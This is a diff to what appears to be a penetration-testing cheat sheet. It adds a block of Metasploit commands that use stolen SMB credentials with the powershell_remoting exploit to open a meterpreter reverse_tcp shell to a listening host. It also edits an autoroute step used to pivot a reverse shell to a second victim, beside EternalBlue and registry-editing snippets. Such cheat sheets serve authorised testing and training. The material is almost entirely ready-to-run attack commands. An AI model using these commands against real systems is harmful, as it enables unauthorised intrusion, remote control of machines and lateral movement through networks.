@@ -658,6 +658,19 @@ meterpreter > powershell_shell
 ```
 
 # Remote Exploits
+##### Remoting
+```bash
+use exploit/windows/local/powershell_remoting
+set SESSION [Session ID]
+set SMBUSER [Username]
+set SMBPASS [Password]
+set SMBDOMAIN [Domain Name]
+set RHOSTS [Target Host]
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST [Listening Host]
+set LPORT [Port]
+exploit -j
+```
 ##### EternalBlue
 ```bash
 msfconsole -q
@@ -726,7 +739,7 @@ meterpreter > reg setval -k 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Service
 ##### Establish Reverse Shell from Second Victim with SMB
 ```bash
 # Add route to Victim 2's subnet, pointing to Victim 1's session.
-use post/windows/manage/autoroute
+use post/multi/manage/autoroute
 set SESSION [Victim 1's Session #]
 set SUBNET [Victim 2's Subnet]
 run
